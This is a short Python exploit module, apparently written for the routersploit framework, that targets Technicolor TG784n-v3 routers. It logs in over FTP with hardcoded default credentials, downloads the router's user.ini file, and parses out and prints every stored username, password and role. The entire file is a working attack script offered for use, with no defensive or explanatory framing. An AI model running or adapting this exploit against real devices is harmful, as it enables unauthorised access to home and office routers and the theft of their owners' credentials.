# rsf exploit module
# description: Exploits Technicolor TG784n-v3 authentication bypass via default FTP credentials and user.ini leak.

import ftplib
import re

def exploit(target, port, username="upgrade", password="Th0ms0n!"):
    try:
        ftp = ftplib.FTP()
        ftp.connect(target, port, timeout=5)
        ftp.login(user=username, passwd=password)
        print("[+] FTP login successful")

        with open("user.ini", "wb") as f:
            ftp.retrbinary("RETR user.ini", f.write)

        with open("user.ini", "r", encoding="utf-8") as f:
            content = f.read()

        creds = re.findall(r"add name=(.*) password=(.*) role=(.*) hash2=(.*) crypt=(.*)", content)
        for c in creds:
            print(f"[+] User: {c[0]}, Password: {c[1]}, Role: {c[2]}")
        ftp.quit()
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

